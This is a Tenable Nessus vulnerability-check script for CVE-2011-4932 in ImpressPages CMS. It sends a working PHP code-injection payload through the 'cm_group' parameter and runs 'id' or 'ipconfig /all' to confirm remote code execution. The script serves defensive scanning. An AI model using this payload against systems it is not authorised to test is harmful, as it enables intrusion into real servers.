#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(64686);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/09/24 21:08:40 $");

  script_cve_id("CVE-2011-4932");
  script_bugtraq_id(49798);
  script_osvdb_id(75783);

  script_name(english:"ImpressPages cm_group Parameter Remote PHP Code Execution");
  script_summary(english:"Attempts to execute arbitrary code");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts an application that allows arbitrary code
execution."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The ImpressPages install hosted on the remote web server contains a
flaw that allows arbitrary PHP code execution.  Input passed to the
'cm_group' parameter is not properly sanitized before being used in a
PHP eval() function call.  An unauthenticated, remote attacker can
leverage this vulnerability to execute arbitrary PHP code on the remote
host."
  );
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2012/Jan/28");
  script_set_attribute(attribute:"see_also", value:"http://www.impresspages.org/news/impresspages-1-0-13-security-release/");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 1.0.13 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/09/21");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/09/21");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/02/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:impresspages:impresspages_cms");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("impresspages_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/PHP", "www/impresspages");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(
  appname      : "impresspages",
  port         : port,
  exit_on_fail : TRUE
);
dir = install["dir"];
install_url = build_url(qs:dir+'/', port:port);

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask";

token = (SCRIPT_NAME - ".nasl") + "-" + unixtime() + ".txt";

foreach cmd (cmds)
{
  payload = "?cm_group=text_photos\title\Module();echo%20system('" + urlencode(str:cmd) + "');echo&cm_name=test";

  res = http_send_recv3(
    port         : port,
    method       : "GET",
    item         : dir + "/" + payload,
    exit_on_fail : TRUE
  );

  match = egrep(pattern:cmd_pats[cmd], string:res[2]);

  if (match)
  {
    # Format output for our report
    if (cmd == 'id')
    {
      body = match;
      body = strstr(body, '\n') - '\n';
    }
    else
    {
      body = res[2];
      index = stridx(body, "<br />");
      body = substr(body, 0, (index - 1));
    }

    snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
    if (report_verbosity > 0)
    {
      report =
        '\n' + "Nessus was able execute the command '"+cmd+"' on the remote" +
        '\n' + "host using the following request :" +
        '\n' +
        '\n' + install_url + payload +
        '\n';
      if (report_verbosity > 1)
      {
        report +=
          '\n' + 'This produced the following output :' +
          '\n' +
          '\n' + snip +
          '\n' + chomp(body) +
          '\n' + snip +
          '\n';
      }
      security_hole(port:port, extra:report);
      exit(0);
    }
    else security_hole(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "ImpressPages", install_url);
